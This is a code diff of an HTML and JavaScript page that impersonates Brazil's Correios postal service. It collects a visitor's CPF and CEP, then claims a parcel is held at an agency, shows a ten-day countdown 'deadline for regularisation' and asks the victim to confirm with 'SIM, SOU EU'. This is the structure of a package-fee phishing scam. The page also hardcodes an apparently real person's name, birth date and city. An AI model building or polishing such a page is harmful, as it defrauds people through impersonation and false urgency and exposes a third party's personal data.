@@ -79,50 +79,44 @@
     }
 
     #res-prazo {
-      display: block;
-      text-align: center;
       color: red;
-      font-size: 1.3rem;
-      margin-top: 1rem;
+      font-weight: bold;
+      display: inline-block;
     }
 
-    #botao-confirmar {
-      display: block;
-      margin: 20px auto 0 auto;
-      padding: 10px 20px;
+    .btn-primary {
       background-color: #007bff;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      font-size: 1.1rem;
-      cursor: pointer;
+      border-color: #007bff;
+      padding: 10px 20px;
+      font-size: 16px;
     }
   </style>
 </head>
 
 <body>
-  <header>
-    <!-- Seu cabeçalho mantido -->
-  </header>
-
   <main>
-    <!-- Formulário -->
     <section id="tela-formulario">
-      <!-- Conteúdo do formulário mantido -->
+      <h1>Consulta de Encomendas - Correios</h1>
       <form id="form-rastreamento">
-        <!-- Campos CPF e CEP -->
-        <!-- Botão + Spinner -->
-        <div id="botao-container">
-          <button type="submit" class="btn btn-primary" id="consultar-btn">Consultar</button>
+        <div>
+          <label for="cpf">CPF:</label>
+          <input type="text" id="cpf" placeholder="Digite seu CPF" required />
         </div>
-        <div id="loading-container" style="display: none; text-align: center; margin-top: 20px;">
-          <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
-          <div class="spinner"></div>
+        <div>
+          <label for="cep">CEP:</label>
+          <input type="text" id="cep" placeholder="Digite seu CEP" required />
+        </div>
+        <div id="botao-container">
+          <button type="submit" id="consultar-btn">Consultar</button>
         </div>
       </form>
     </section>
 
-    <!-- Resultado -->
+    <div id="loading-container" style="display:none;">
+      <div class="spinner"></div>
+      <p>Consultando informações...</p>
+    </div>
+
     <section id="resultado" style="display: none;">
       <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
       <p><span>Nome:</span> <span id="res-nome"></span></p>
@@ -133,16 +127,14 @@
       <p><span>Bairro:</span> <span id="res-bairro"></span></p>
       <p><span>Cidade:</span> <span id="res-cidade"></span></p>
       <p><span>Estado:</span> <span id="res-estado"></span></p>
-      <p><span>Prazo para Regularização:</span></p>
-      <p id="res-prazo">Carregando prazo...</p>
-
-      <button id="botao-confirmar">SIM, SOU EU</button>
+      <p style="text-align:center;">
+        <span>Prazo para Regularização:</span> <span id="res-prazo"></span>
+      </p>
+      <div style="text-align: center; margin-top: 20px;">
+        <button class="btn btn-primary">SIM, SOU EU</button>
+      </div>
     </section>
   </main>
-
-  <footer>
-    <!-- Rodapé mantido -->
-  </footer>
 
   <script>
     function formatarCPF(cpf) {
@@ -153,15 +145,16 @@
       return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
     }
 
-    function atualizarContagem(prazoFinal) {
-      const prazoElemento = document.getElementById("res-prazo");
-      const interval = setInterval(() => {
-        const agora = new Date().getTime();
-        const distancia = prazoFinal - agora;
+    function startContagemRegressiva(dataFinal) {
+      const prazoSpan = document.getElementById("res-prazo");
+
+      function atualizar() {
+        const agora = new Date();
+        const distancia = dataFinal - agora;
 
         if (distancia <= 0) {
-          clearInterval(interval);
-          prazoElemento.innerHTML = "Prazo expirado!";
+          prazoSpan.textContent = "Prazo encerrado!";
+          clearInterval(timer);
           return;
         }
 
@@ -170,22 +163,28 @@
         const minutos = Math.floor((distancia % (1000 * 60 * 60)) / (1000 * 60));
         const segundos = Math.floor((distancia % (1000 * 60)) / 1000);
 
-        prazoElemento.innerHTML = `${dias}d ${horas}h ${minutos}m ${segundos}s restantes`;
-      }, 1000);
+        prazoSpan.textContent = `${dias}d ${horas}h ${minutos}m ${segundos}s`;
+      }
+
+      atualizar();
+      const timer = setInterval(atualizar, 1000);
     }
 
     document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
       event.preventDefault();
 
-      const cpfInput = document.getElementById("cpf").value.replace(/\D/g, "");
-      const cepInput = document.getElementById("cep").value.replace(/\D/g, "");
+      const cpfInput = document.getElementById("cpf");
+      const cepInput = document.getElementById("cep");
 
-      if (cpfInput.length !== 11) {
+      const cpfRaw = cpfInput.value.replace(/\D/g, "");
+      const cepRaw = cepInput.value.replace(/\D/g, "");
+
+      if (!cpfRaw || cpfRaw.length !== 11) {
         alert("Por favor, insira um CPF válido.");
         return;
       }
 
-      if (cepInput.length !== 8) {
+      if (!cepRaw || cepRaw.length !== 8) {
         alert("Por favor, insira um CEP válido.");
         return;
       }
@@ -197,22 +196,35 @@
 
       const prazoFinal = new Date();
       prazoFinal.setDate(prazoFinal.getDate() + 10);
-      prazoFinal.setHours(23, 59, 0, 0);
+      prazoFinal.setHours(23);
+      prazoFinal.setMinutes(59);
+      prazoFinal.setSeconds(0);
 
-      document.getElementById("res-nome").textContent = "Rosiane Oliveira Da Silva";
-      document.getElementById("res-cpf").textContent = formatarCPF(cpfInput);
-      document.getElementById("res-nascimento").textContent = "27/01/1985";
-      document.getElementById("res-cep").textContent = formatarCEP(cepInput);
-      document.getElementById("res-rua").textContent = "";      // Rua em branco
-      document.getElementById("res-bairro").textContent = "";   // Bairro em branco
-      document.getElementById("res-cidade").textContent = "Porciúncula";
-      document.getElementById("res-estado").textContent = "RJ";
+      const dadosPessoa = {
+        nome: "Rosiane Oliveira Da Silva",
+        cpf: formatarCPF(cpfRaw),
+        nascimento: "27/01/1985",
+        cep: formatarCEP(cepRaw),
+        rua: "",
+        bairro: "",
+        cidade: "Porciúncula",
+        estado: "RJ"
+      };
 
-      atualizarContagem(prazoFinal);
+      document.getElementById("res-nome").textContent = dadosPessoa.nome;
+      document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
+      document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
+      document.getElementById("res-cep").textContent = dadosPessoa.cep;
+      document.getElementById("res-rua").textContent = dadosPessoa.rua;
+      document.getElementById("res-bairro").textContent = dadosPessoa.bairro;
+      document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
+      document.getElementById("res-estado").textContent = dadosPessoa.estado;
 
       document.getElementById("loading-container").style.display = "none";
       document.getElementById("tela-formulario").style.display = "none";
       document.getElementById("resultado").style.display = "block";
+
+      startContagemRegressiva(prazoFinal);
     });
   </script>
 </body>
